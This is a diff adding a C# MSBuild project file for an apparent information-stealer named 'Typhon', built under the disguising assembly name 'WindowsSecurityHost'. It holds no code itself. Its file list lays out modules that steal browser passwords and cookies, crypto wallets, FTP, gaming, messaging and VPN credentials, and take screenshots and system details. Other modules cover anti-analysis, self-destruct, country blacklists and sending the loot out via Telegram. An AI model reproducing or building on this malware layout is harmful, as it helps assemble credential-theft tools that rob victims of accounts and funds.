@@ -1,0 +1,146 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{7EDFF60F-6878-4C18-BAF7-B636ECD1AEAE}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>WindowsSecurityHost</RootNamespace>
+    <AssemblyName>WindowsSecurityHost</AssemblyName>
+    <TargetFrameworkVersion>v4.5.2</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Typhon.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="BouncyCastle.Crypto" />
+    <Reference Include="DotNetZip" />
+    <Reference Include="Microsoft.CSharp" />
+    <Reference Include="Newtonsoft.Json" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="Costura\AssemblyLoader.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="Typhon\Config.cs" />
+    <Compile Include="Typhon\Modules\Blacklist\AntiCIS.cs" />
+    <Compile Include="Typhon\Modules\Blacklist\BlacklistedCountries.cs" />
+    <Compile Include="Typhon\Modules\Blacklist\BlacklistedUsernames.cs" />
+    <Compile Include="Typhon\Modules\FileGrabber\FileStealer.cs" />
+    <Compile Include="Typhon\Modules\Implants\AntiAnalysis.cs" />
+    <Compile Include="Typhon\Modules\Implants\Delay.cs" />
+    <Compile Include="Typhon\Modules\Implants\SelfDestruct.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\AesGcm.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\CBCrypt.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\CCHelper.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\Counter.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\Crypto.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\DataFormatter.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\DataModels.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\DecryptHelper.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\IOHelper.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSON.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONArray.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONBool.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONLazyCreator.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONNode.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONNodeType.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONNull.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONNumber.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONObject.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONString.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\JSONTextMode.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\Networking.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\Paths.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\SQLite.cs" />
+    <Compile Include="Typhon\Modules\Miscellaneous\SqlReader.cs" />
+    <Compile Include="Typhon\Program.cs" />
+    <Compile Include="Typhon\Properties\Resources.cs" />
+    <Compile Include="Typhon\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Typhon\Stealer\Save.cs" />
+    <Compile Include="Typhon\Stealer\Software\Browsers\Chromium\ChromiumRecovery.cs" />
+    <Compile Include="Typhon\Stealer\Software\Browsers\Edge\EdgeRecovery.cs" />
+    <Compile Include="Typhon\Stealer\Software\Browsers\Gecko\GeckoRecovery.cs" />
+    <Compile Include="Typhon\Stealer\Software\CryptoApps\ChromeCryptoExtensionStealer.cs" />
+    <Compile Include="Typhon\Stealer\Software\CryptoApps\CryptoWalletStealer.cs" />
+    <Compile Include="Typhon\Stealer\Software\CryptoApps\EdgeCryptoExtensionStealer.cs" />
+    <Compile Include="Typhon\Stealer\Software\FTP\FileZilla.cs" />
+    <Compile Include="Typhon\Stealer\Software\FTP\WinSCP.cs" />
+    <Compile Include="Typhon\Stealer\Software\Gaming\BattleNET.cs" />
+    <Compile Include="Typhon\Stealer\Software\Gaming\Minecraft.cs" />
+    <Compile Include="Typhon\Stealer\Software\Gaming\Steam.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Discord.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Element.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\ICQ.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Outlook.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Pidgin.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Signal.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Skype.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Telegram.cs" />
+    <Compile Include="Typhon\Stealer\Software\Messaging\Tox.cs" />
+    <Compile Include="Typhon\Stealer\Software\VPN\Class1.cs" />
+    <Compile Include="Typhon\Stealer\Software\VPN\Class2.cs" />
+    <Compile Include="Typhon\Stealer\Software\VPN\Class3.cs" />
+    <Compile Include="Typhon\Stealer\SystemInfo\GetWifiDetails.cs" />
+    <Compile Include="Typhon\Stealer\SystemInfo\HardwareDetails.cs" />
+    <Compile Include="Typhon\Stealer\SystemInfo\SaveOpenedWindows.cs" />
+    <Compile Include="Typhon\Stealer\SystemInfo\SaveRunningProcess.cs" />
+    <Compile Include="Typhon\Stealer\SystemInfo\SaveScreenshot.cs" />
+    <Compile Include="Typhon\Stealer\SystemInfo\UserDetails.cs" />
+    <Compile Include="Typhon\Telegram.cs" />
+    <Compile Include="WindowsSecurityHost_ProcessedByFody.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Costura\bouncycastle\crypto\dll.compressed" />
+    <EmbeddedResource Include="Costura\costura\dll.compressed" />
+    <EmbeddedResource Include="Costura\costura\pdb.compressed" />
+    <EmbeddedResource Include="Costura\dotnetzip\dll.compressed" />
+    <EmbeddedResource Include="Costura\dotnetzip\pdb.compressed" />
+    <EmbeddedResource Include="Costura\metadata" />
+    <EmbeddedResource Include="Costura\newtonsoft\json\dll.compressed" />
+    <EmbeddedResource Include="Costura\system\runtime\interopservices\runtimeinformation\dll.compressed" />
+    <EmbeddedResource Include="Typhon\Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Typhon\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
